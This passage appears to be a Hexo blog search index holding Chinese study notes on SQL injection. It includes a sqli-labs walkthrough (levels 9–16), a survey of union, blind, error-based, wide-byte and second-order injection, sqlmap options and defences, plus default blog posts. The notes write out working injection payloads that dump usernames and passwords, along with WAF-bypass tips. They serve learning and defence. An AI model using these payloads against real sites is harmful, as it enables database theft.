title="时间型盲注"></a>时间型盲注</h4><p>​第九关会发现我们<strong>不管输入什么页面显示的东西都是一样的</strong>，这个时候布尔盲注就不适合我们用，<strong>布尔盲注适合页面对于错误和正确结果有不同反应</strong>。<strong>如果页面一直不变这个时候我们可以使用时间注入</strong>，时间注入和布尔盲注两种没有多大差别只不过时间盲注多了<strong>if函数</strong>和<strong>sleep()函数</strong>。if(a,sleep(10),1)如果a结果是真的，那么执行sleep(10)页面延迟10秒，如果a的结果是假，执行1，页面不延迟。通过页面时间来判断出id参数是单引号字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(1=1,sleep(5),1)--+</span><br><span class="line">判断参数构造。</span><br><span class="line">?id=1&#x27;and if(length((select database()))&gt;9,sleep(5),1)--+</span><br><span class="line">判断数据库名长度</span><br><span class="line"> </span><br><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+</span><br><span class="line">逐一判断数据库字符</span><br><span class="line">?id=1&#x27;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+</span><br><span class="line">判断所有表名长度</span><br><span class="line"> </span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断表名</span><br><span class="line">?id=1&#x27;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20,sleep(5),1)--+</span><br><span class="line">判断所有字段名的长度</span><br><span class="line"> </span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断字段名。</span><br><span class="line">?id=1&#x27; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+</span><br><span class="line">判断字段内容长度</span><br><span class="line"> </span><br><span class="line">?id=1&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span><br><span class="line">逐一检测内容。</span><br></pre></td></tr></table></figure><h3 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h3><p>同9，改成双引号</p><h3 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h3><p>可以看到界面编程输入框，先用 1’ 试出为字符型，后面步骤和1相同，注释改为“#”</p><h3 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h3><p>双引号+括号</p><h3 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h3><p>单引号+括号</p><h3 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h3><p>双引号（同11）</p><h3 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h3><p>布尔型盲注（11）</p><h3 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h3><p>布尔型盲注（12）</p><h5 id="好啦，先做到这里，我准备去聚餐啦！"><a href="#好啦，先做到这里，我准备去聚餐啦！" class="headerlink" title="好啦，先做到这里，我准备去聚餐啦！"></a>好啦，先做到这里，我准备去聚餐啦！</h5>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入攻击</title>
      <link href="/2024/08/23/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/"/>
      <url>/2024/08/23/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><del>先来整理一下知识点</del></p><h1 id="概念相关："><a href="#概念相关：" class="headerlink" title="概念相关："></a>概念相关：</h1><p> 对于 Web 应用程序而言，用户核心数据存储在数据库中，例如：MySQL、SQL Server、Oracle 等。<br> 通过 SQL 注入攻击，可以获取、修改、删除数据库信息，并且通过提权来控制 Web 服务器等其他操作。<br> 漏洞产生的主要原因是服务器对用户输入的信息没有做过滤。<br> 攻击者通过构造特殊的 SQL 语句，入侵目标系统，致使后台数据库泄露数据。</p><h1 id="影响："><a href="#影响：" class="headerlink" title="影响："></a>影响：</h1><ul><li>用户信息被泄露，甚至被非法倒卖。</li><li>危害企业、政府、国家等组织安全。</li><li>注入后<ul><li>查询数据</li><li>读写文件<ul><li>需要高权限（root 权限）。</li><li>需要有文件写入权限 secure_file_priv 不是 NULL。<ul><li>查看方法：show VARIABLES LIKE ‘%secure%’</li></ul></li><li>需要知道绝对路径。</li><li>魔术引号 gbc 是关闭的，即 magic_quotes_gpc &#x3D; Off。</li></ul></li><li>执行敏感命令</li></ul></li></ul><h1 id="攻击方法："><a href="#攻击方法：" class="headerlink" title="攻击方法："></a>攻击方法：</h1><ul><li>将 SQL 代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的 SQL 服务器加以解析并执行。</li></ul><p><img src="/SQLpic/image-20240823112449637.png" alt="image"></p><h1 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h1><p>以有无闭合字符分类：字符型、数字型</p><p>以数据传输方式分类：post型、get型</p><p>以注入方式分类：联合查询注入、报错型注入、布尔型盲注、时间型盲注、宽字节注入、二次注入</p><h2 id="联合查询注入："><a href="#联合查询注入：" class="headerlink" title="联合查询注入："></a>联合查询注入：</h2><ul><li><p>概述</p><ul><li>普通注入是根据后台数据库提示有价值的错误信息，进行注入操作，一般可以把攻击者需要获得的信息直接查询显示在页面中。</li></ul></li><li><p>核心方法</p><ul><li>使用 union 合并两个或多个 SELECT 语句的结果集，第二个语句中就包含我们想要查询的语句。</li></ul></li><li><h4 id="常用系统库"><a href="#常用系统库" class="headerlink" title="常用系统库"></a>常用系统库</h4><ul><li>information_schema<ul><li>概述<ul><li>information_schema 数据库是 MySQL5.0 及以上系统自带的数据库。其中保存着关于 MySQL 服务器所维护的所有其他数据库的信息。</li><li>如果我们用于注入的账号，有能够读取该库的权限，那么我们离脱裤就非常非常近了。</li></ul></li></ul></li></ul></li><li><p>常用表：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> tables 表</span><br><span class="line">     table_schema：保存所有库名的列</span><br><span class="line">     table_name：保存所有表名的列</span><br><span class="line"> ​</span><br><span class="line"> columns 表</span><br><span class="line">     table_name：保存所有表名的列</span><br><span class="line">     column_name：保存所有列名的列</span><br></pre></td></tr></table></figure><h2 id="盲注："><a href="#盲注：" class="headerlink" title="盲注："></a>盲注：</h2><ul><li><p>概述</p><ul><li>当我们输入的注入语句被带入数据库查询，页面却不能回显结果时，如：应用程序只会返回一个通用的（对错信息或什么信息都不显示）页面或特定的语句，我们不能以此来判断注入是否成功，这种情况下就要用到 SQL 盲注的技巧。</li><li>目标网站的数据库是 Access，系统中没有类似 MySQL 的 Information_schema 库。</li><li>攻击者运用脚本通过仅有的判断信息对表中每个字段进行探测，从而实现注入。</li></ul><h4 id="常用函数："><a href="#常用函数：" class="headerlink" title="常用函数："></a>常用函数：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">   substr()    # 截取字符串</span><br><span class="line">   ​</span><br><span class="line">   left()  # 截取前几个字符串</span><br><span class="line">  </span><br><span class="line">right()# 截取后几个字符串</span><br><span class="line">  </span><br><span class="line">reverse()# 反转字符串</span><br><span class="line">   ​</span><br><span class="line">   length()    # 计算字符串长度</span><br><span class="line">   ​</span><br><span class="line">   ascii()     # 字符串转换为 ASCII 码</span><br><span class="line">   ​</span><br><span class="line">   ord()   # 字符串转换为 ASCII 码</span><br><span class="line">   ​</span><br><span class="line">   regexp  # 正则判断</span><br><span class="line">   ​</span><br><span class="line">   like    # 模糊匹配</span><br></pre></td></tr></table></figure><ul><li><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><ul><li><h4 id="布尔型"><a href="#布尔型" class="headerlink" title="布尔型"></a>布尔型</h4><ul><li>概述<ul><li>目标页面上没有显示数据内容的功能，仅有显示对错或有无（布尔值）的提示。</li></ul></li><li>攻击方法<ul><li>通过构造特殊 SQL 语句，观察页面返回的对错来判断 SQL 语句是否成立。</li></ul></li></ul></li><li><h4 id="时间型"><a href="#时间型" class="headerlink" title="时间型"></a>时间型</h4><ul><li><p>概述</p><ul><li>对于某些页面，可能任何信息都不返回，甚至连记录是否存在都不告诉你，此时布尔型就失效了。</li><li>通过构造条件语句，条件语句判断为真则立即执行，否则延时执行。</li></ul></li><li><p>攻击方法</p><ul><li>通过 sleep() 函数，观察页面返回是否有延时来判断 SQL 语句是否成立。</li></ul></li></ul></li></ul></li></ul></li></ul><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>概述</p><ul><li><p>当数据库的函数被传入错误参数时，会发生语法错误，正常情况下这类错误不应该回显到前端页面，但当中间件或程序未正常屏蔽时导致错误信息输出到屏幕上，就能用来进行报错注入了。</p></li><li><p>select&#x2F;insert&#x2F;update&#x2F;delete 都可以进行报错注入。</p></li><li><p>报错注入条件</p><ul><li>后台没有屏蔽数据库报错信息，在语法发生错误时会输出在前端。</li><li>运维人员设置中间件的时候，错误输出没有屏蔽。</li><li>程序员写网站代码的时候，没有屏蔽错误信息输出。</li></ul></li></ul><h3 id="常用函数：-1"><a href="#常用函数：-1" class="headerlink" title="常用函数："></a>常用函数：</h3><ul><li>extractvalue() ：对 XML 文档数据进行查询的 XPATH 函数。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> extractvalue (XML_document, XPath_string); </span><br><span class="line"> # XML_document 是 String 格式，为 XML 文档的字段名。</span><br><span class="line"> # XPath_string 是 Xpath 格式的字符串。</span><br></pre></td></tr></table></figure><ul><li>updatexml() ：对 XML 文档数据进行修改的 XPATH 函数。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> updatexml (XML_document, XPath_string, new_value); </span><br><span class="line"> # XML_document 是 String 格式，为 XML 文档的字段名。</span><br><span class="line"> # XPath_string 是 Xpath 格式的字符串  。</span><br><span class="line"> # new_value 是 String 格式，替换查找到的符合条件的数据。</span><br></pre></td></tr></table></figure><ul><li>floor() 和 rand() 和 count()</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> 1 and (select count(*) from user group by concat(user(),floor(rand(0)*2))); # 爆出当前连接数据库的用户名</span><br><span class="line"> ​</span><br><span class="line"> 1 and (select count(*) from user group by concat(database(),floor(rand(0)*2))); # 爆出数据库名</span><br><span class="line"> ​</span><br><span class="line"> 1 and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),floor(rand(0)*2)) x from information_schema.tables group by x) a);  # 爆表</span><br><span class="line"> ​</span><br><span class="line"> 1 and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;user&#x27; limit 3,1),floor(rand(0)*2)) x from information_schema.columns group by x) a); # 爆字段</span><br><span class="line"> ​</span><br><span class="line"> 1 and (select 1 from (select count(*),concat((select password from user limit 0,1),floor(rand(0)*2)) x from information_schema.tables group by x) a);   # 爆数据</span><br></pre></td></tr></table></figure><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p>​总的来说，floor() 报错注入的原因是 group by 在向临时表插入数据时，由于 rand() 多次计算导致插入临时表时主键重复，从而报错，又因为报错前 concat() 中的 SQL 语句或函数被执行，所以该语句报错且被抛出的主键是 SQL 语句或函数执行后的结果。</p><ul><li>group by 和 conut<ul><li>在使用 group by 和 count 后，group by 会依次从 user 表中查询记录，建立一张虚拟的表，当表中的 Key（主键）存在时，count 会自动 +1，如果 key 不存在，则将 key 插入到临时表中。<ul><li>如：现在去 user 表中查第一条记录，username 为 lm，发现临时表中没有该 key（主键），则将该 key 插入到临时表中，count 记为 1。同样在查询第二条记录时，username 为 liuc，临时表中也没有该 key，直接将 key 插入到临时表中，count 记为 1。</li></ul></li></ul></li><li>group by 和 rand<ul><li>而当 group by 与 rand 一起使用时，如果临时表中没有该主键，rand 会再计算一次，率先将第二次的计算结果插入到临时表。</li></ul></li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> 1.创建临时表，执行 group by 时 database() 被执行，得到 security，再经过 floor(rand(0)*2)，最后 concat 为 security0。</span><br><span class="line"> ​</span><br><span class="line"> 2.此时临时表中没有此 key，会再次 rand(0)*2 计算一次，此时得到的结果是 security1，直接将 security1 插入到临时表中，并且 count 计数为 1。</span><br><span class="line"> ​</span><br><span class="line"> 3.读取第二条数据时，group by 的 key 中的 0 和 1 仍然由 floor(rand(0)*2) 计算所得，此次为第三次计算结果是 1，则 key 为 security1，这时候会查询临时表，临时表中已有 security1 的 key，所以 count 直接 +1。</span><br><span class="line"> ​</span><br><span class="line"> 4.同理，继续读取第三条记录，第三次的 key 为 security0，但是此时临时表没有此 key，所以会继续计算，得出 key 为 security1，直接将 security1 插入到临时表中，因为与上面键名重复，所以导致了报错。</span><br></pre></td></tr></table></figure><ul><li>floor(x) : 向下取整的函数，即取不大于 x 的最大整数。按照数轴上取最接近要求值的左边值。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT FLOOR(10.5)  # 返回 10</span><br></pre></td></tr></table></figure><ul><li>rand(x) : 随机产生一个 0-1 之间的浮点数。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> SELECT RAND()</span><br><span class="line"> SELECT FLOOR(RAND(0)*2) FROM user   # 依次调用 FLOOR(RAND(0)*2)，会按顺序返回 [0,1,1,0,1]</span><br></pre></td></tr></table></figure><p>特点：当指定参数 x 之后，会生成固定的伪随机序列。即固定了参数，之后每次生成的值都是一样的，故称之为固定的伪随机数字（产生的数字都是可预知的）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">floor(rand(0)*2)</span><br><span class="line">产生一个伪随机序列（结果已知），因为 *2，所以返回结果只能是 0 或 1。</span><br></pre></td></tr></table></figure><ul><li>count(*) : 返回值的数目，与 count() 的区别在于其不排除 NULL，count() 如果统计到 NULL，返回的结果即为 NULL。</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h3><ul><li>优点是注入速度快。</li><li>缺点是语句较为复杂，而且只能用 limit 依次进行猜解。</li><li>总体来说，报错注入其实是一种公式化的注入方法，主要用于在页面中没有显示位，但是 mysql 输出了错误信息时使用。</li></ul><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><ul><li><p>漏洞产生和后端编码有关，如后端采用 GBK 编码。</p></li><li><p>数据库使用 GBK 编码时，两个字符为一个汉字。</p></li><li><p>ASCII 码只有 128 个，大于 128 的就会和第二个字符组成一个汉字。</p></li><li><p>语法：</p></li></ul><p>​%df’ or 1&#x3D;1 #</p><p>​%dd’ or 1&#x3D;1 #</p><p>​%9c’ or 1&#x3D;1 #</p><ul><li>核心机制：</li></ul><p>​数据 —&gt; (check_addslashes) —&gt; XXX —&gt; (GBK) —&gt; 数据库执行的内容。</p><p>​%df%27 —&gt; (check_addslashes) —&gt; %df%5c%27 —&gt; (GBK) —&gt; 運’。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Eg：</span><br><span class="line">使用 %df&#x27; 注入，后端（PHP）会在引号前面加 \ 进行转义。</span><br><span class="line"></span><br><span class="line">数据库收到 %df\&#x27; 后，由于使用 GBK 编码，发现第一个编码大于 128，因此会使用前两个字符（%df\）进行编码。</span><br><span class="line"></span><br><span class="line">编码结果为 運&#x27;。</span><br><span class="line"></span><br><span class="line">此时就可以正常进行 sql 注入。</span><br></pre></td></tr></table></figure><p>可用编码组合：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">\ 的 URL 编码是 %5C</span><br><span class="line"></span><br><span class="line">%df%5c 的 GBK 编码是&quot;運&quot;</span><br><span class="line"></span><br><span class="line">%dd%5c 的 GBK 编码是&quot;輁&quot;</span><br><span class="line"></span><br><span class="line">%9c%5c 的 GBK 编码是&quot;淺&quot;</span><br><span class="line"></span><br><span class="line">&#x27; 的 URL 编码是 %27</span><br><span class="line"></span><br><span class="line">可以试试用百度搜索进行转码</span><br></pre></td></tr></table></figure><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><ul><li>有些程序在进行数据库插入的时候，仅仅对特殊字符进行了转义，但仍然将数据写入了数据库，如果插入的数据包含恶意内容，此时在其他地方查询该数据时，如果没有对取出的数据做校验处理（即认为写入即可信），直接使用该数据，就会造成 SQL 二次注入。</li></ul><h4 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h4><ul><li>php 代码中用了 urldecode() 等编码函数，对 url 中的特殊字符进行转码，可以利用此函数与 php 自身编码转换，产生漏洞。</li></ul><h2 id="以注入的位置分类"><a href="#以注入的位置分类" class="headerlink" title="以注入的位置分类"></a><strong>以注入的位置分类</strong></h2><ul><li><h4 id="GET-注入"><a href="#GET-注入" class="headerlink" title="GET 注入"></a>GET 注入</h4><ul><li>可通过安装浏览器插件（hackbar）或直接通过浏览器地址栏提交。</li></ul></li><li><h4 id="POST-注入"><a href="#POST-注入" class="headerlink" title="POST 注入"></a>POST 注入</h4><ul><li>可通过安装浏览器插件（hackbar）或 Burpsuite 来完成。</li></ul></li><li><h4 id="Cookie-注入"><a href="#Cookie-注入" class="headerlink" title="Cookie 注入"></a>Cookie 注入</h4><ul><li>GET 和 POST 如果被过滤，可以试试。</li><li>一般通过 Burpsuite 来完成，修改 Cookie 进行注入。</li></ul></li><li><h4 id="UA-注入"><a href="#UA-注入" class="headerlink" title="UA 注入"></a>UA 注入</h4><ul><li>一般通过 Burpsuite 来完成，修改 UA 进行注入。</li></ul></li></ul><h2 id="以注入的参数类型分类"><a href="#以注入的参数类型分类" class="headerlink" title="以注入的参数类型分类"></a><strong>以注入的参数类型分类</strong></h2><ul><li><h4 id="数字注入"><a href="#数字注入" class="headerlink" title="数字注入"></a>数字注入</h4><ul><li>当输入的参数为整型时，如 ID、年龄、页码等，如果存在注入漏洞，则可以认为是数字型注入。</li></ul></li><li><h4 id="字符注入"><a href="#字符注入" class="headerlink" title="字符注入"></a>字符注入</h4><ul><li>当输入参数为字符串时，称为字符型。数字型与字符型注入最大的区别在于：数字型不需要引号闭合，而字符串类型一般要使用引号或其他符号来闭合。</li></ul></li><li><h4 id="搜索注入"><a href="#搜索注入" class="headerlink" title="搜索注入"></a>搜索注入</h4><ul><li>当在搜索框注入的时候，称为搜索型。搜索类型一般要使用百分号进行闭合。</li></ul></li></ul><h2 id="自动化注入（SQLmap）"><a href="#自动化注入（SQLmap）" class="headerlink" title="自动化注入（SQLmap）"></a>自动化注入（SQLmap）</h2><ul><li>SQLMAP 是一个自动化的 SQL 注入工具，其主要功能是扫描，发现并利用给定的 URL 和 SQL 注入漏洞，其广泛的功能和选项包括获取数据库指纹，数据库提权，访问目标文件系统，并在获取操作权限时执行任意命令。</li></ul><h3 id="常用参数："><a href="#常用参数：" class="headerlink" title="常用参数："></a>常用参数：</h3><ul><li><p>-u</p><ul><li>指定 URL。</li></ul></li><li><p>-m</p><ul><li>指定某个路径下的 txt 文件，进行批量注入。</li></ul></li><li><p>-r</p><ul><li>指定某个路径下的 txt 文件，进行 POST 或 Cookie 注入。</li></ul></li><li><p>–dbs</p><ul><li>爆数据库名字。</li></ul></li><li><p>-D</p><ul><li>指定数据库名字。</li></ul></li><li><p>–tables</p><ul><li>爆表名。</li></ul></li><li><p>-T</p><ul><li>指定表名。</li></ul></li><li><p>–columns</p><ul><li>爆列名。</li></ul></li><li><p>-C</p><ul><li>指定列名，多个列名用逗号分隔。</li></ul></li><li><p>–dump</p><ul><li>爆列名对应的值。</li></ul></li><li><p>–level</p><ul><li>指定测试等级，主要影响检测的位置。</li></ul></li><li><p>–risk</p><ul><li>指定测试风险，主要影响检测的语句。</li></ul></li><li><p>–tamper</p><ul><li>指定绕 WAF 的脚本。</li></ul></li></ul><h2 id="防护方法："><a href="#防护方法：" class="headerlink" title="防护方法："></a>防护方法：</h2><ol><li><p>对用户提交的信息进行安全性检查，把所有非法字符进行过滤或转义，并且后端不要使用 GBK 编码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addslashes()    # 指定的预定义字符前添加反斜杠。这些字符是单引号（&quot;）、双引号（“”）、反斜线（\）与 NULL（NULL 字符）</span><br></pre></td></tr></table></figure></li><li><p>对于 JAVA、PHP 站点，可以使用 PDO 技术彻底杜绝 SQL 注入。</p></li><li><p>使用 WAF 进行拦截，云端防护。</p><ul><li>如免费或开源的有 hihttps、mod security、安全狗等。</li><li>各厂商的 WAF 产品。</li></ul></li><li><p>避免网站显示 SQL 错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一篇博客</title>
      <link href="/2024/08/23/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2024/08/23/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>搞这篇博客主要是记录一下我的复习巩固和学习过程</p><p>有什么问题可以联系我的QQ邮箱噢：<a href="mailto:&#56;&#x37;&#53;&#x31;&#51;&#x31;&#50;&#51;&#x40;&#113;&#113;&#x2e;&#99;&#111;&#x6d;">&#56;&#x37;&#53;&#x31;&#51;&#x31;&#50;&#51;&#x40;&#113;&#113;&#x2e;&#99;&#111;&#x6d;</a></p><!-- [!img](/pic/03aa5cdbffb6fa9eb8c1447f3fd7589d.jpg) --><p>&#96;</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 茶水间 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/08/22/hello-world/"/>
      <url>/2024/08/22/hello-world/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
